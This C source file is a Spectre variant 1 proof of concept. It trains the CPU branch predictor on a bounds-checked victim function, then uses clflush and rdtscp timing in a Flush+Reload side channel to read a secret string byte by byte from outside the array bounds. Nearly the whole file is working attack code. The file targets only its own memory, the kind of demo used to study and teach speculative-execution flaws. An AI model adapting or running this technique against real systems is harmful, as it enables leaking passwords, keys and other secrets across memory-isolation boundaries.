/*********************************************************************
*
* Spectre PoC
*
**********************************************************************/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <stdbool.h>

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "abcdefghijklmnopq.";

uint8_t temp = 0;


void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analysis code
********************************************************************/

/* wait for a while */
static inline void wait() {
    sched_yield();
    sched_yield();
    sched_yield();
    sched_yield();
    sched_yield();
    sched_yield();
    sched_yield();
}

/*
 * the code for flushing an address from cache to memory
 * the input is a pointer
 */
static inline void flush(void *addr) {
    asm volatile("clflush 0(%0)": : "r" (addr):);
}

/*
 * the code for loading an address and timing the load
 * the output of this function is the time in CPU cycles
 * the input is a pointer
 */
static inline uint32_t memaccesstime(void *v) {
    uint32_t rv;
    asm volatile("mfence\n"
                 "lfence\n"
                 "rdtscp\n"
                 "mov %%eax, %%esi\n"
                 "mov (%1), %%eax\n"
                 "rdtscp\n"
                 "sub %%esi, %%eax\n"
    : "=&a"(rv)
    : "r"(v)
    : "ecx", "edx", "esi");
    return rv;
}

static int getCacheHitThresholdTime(int N, bool verbose) {
    uint8_t a[N];
    int ramAccessTime[N], cacheAccessTime[N];
    int avgRamAccessTime = 0;
    int avgCacheAccessTime = 0;
    for (int i = 0; i < N; i++) a[i] = 1;

    /*
     * in each iteration, flush, wait, and then reload and time the reload
     */
    for (int i = 0; i < N; i++) {
        flush(&(a[i]));
        wait();
        ramAccessTime[i] = (int) memaccesstime(&(a[i]));
        wait();
        cacheAccessTime[i] = (int) memaccesstime(&(a[i]));
        wait();
        avgRamAccessTime += ramAccessTime[i];
        avgCacheAccessTime += cacheAccessTime[i];
    }
    avgRamAccessTime /= N;
    avgCacheAccessTime /= N;

    int cacheHitThreshold = (avgRamAccessTime + avgCacheAccessTime) / 2;
    if (verbose) {
        printf("\n");
        printf("Average RAM Access Time   : %4d\n", avgRamAccessTime);
        printf("Average Cache Access Time : %4d\n", avgCacheAccessTime);
        printf("Cache Hit Threshold       : %4d\n", cacheHitThreshold);
    }
    return cacheHitThreshold;
}

static inline void flushAndCall(size_t address) {
    flush(&array1_size);
    wait();
    victim_function(address);
}

int *checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num_tries) {
    static int results[256];
    static int returnValues[2];
    static int i, temp;

    for (i = 0; i < 256; i++) results[i] = 0;

    while (num_tries-- > 0) {

        /* Flush array2 */
        for (i = 0; i < 256; i++)
            flush(&array2[i * 512]);
        wait();

        /* Training the Branch Prediction of the victim code */
        for (i = 10; i >= 0; i--)
            flushAndCall(num_tries % array1_size);
        wait();

        /* Forget about trainingAddress */
        for (i = 0; i < 256; i++)
            flush(&array2[i * 512]);
        wait();

        /* Calling victim code so it loads data to cache */
        flushAndCall(relativeAddress);

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            temp = ((i * 167) + 13) & 255;
            if (memaccesstime(&array2[temp * 512]) < cacheHitThreshold) {
                results[temp]++;
            }
        }
    }

    int max_index = 0;
    for (i = 0; i < 256; i++) {
        if (results[i] >= results[max_index]) {
            max_index = i;
        }
    }

    returnValues[0] = max_index;
    returnValues[1] = results[max_index];
    return returnValues;
}

int main() {
    const int num_tries = 1000;
    const int maxStringSize = 1000;

    int index = 0;
    int *probableValue;
    char foundSecret[maxStringSize];

    const int cacheHitThreshold = getCacheHitThresholdTime(10000, true);
    size_t secretRelativeAddress = ((size_t) secret) - ((size_t) array1);

    /* write to array2 so in RAM not copy-on-write zero pages */
    for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 0;

    printf("\n");
    printf("Reading %lu bytes:\n", strlen(secret));

    while (true) {
        if (index > maxStringSize) break;

        probableValue = checkRelativeAddress(cacheHitThreshold, secretRelativeAddress, num_tries);
        foundSecret[index] = (char) probableValue[0];
        foundSecret[index + 1] = '\0';
        if (foundSecret[index] == '\0') break;

        printf("Speculatively accessed virtual address: %p ", (void *) secretRelativeAddress);
        printf("Got secret: %3d = '%c' ", probableValue[0], foundSecret[index]);
        printf("Success Rate: %4d/%d", probableValue[1], num_tries);
        printf("\n");

        secretRelativeAddress++;
        index++;
    }

    printf("\n");
    printf("Secret: \"%s\"\n", secret);
    printf("Found : \"%s\"\n", foundSecret);
    printf("Match : %s\n", strcmp(secret, foundSecret) == 0 ? "true" : "false");
    return 0;
}
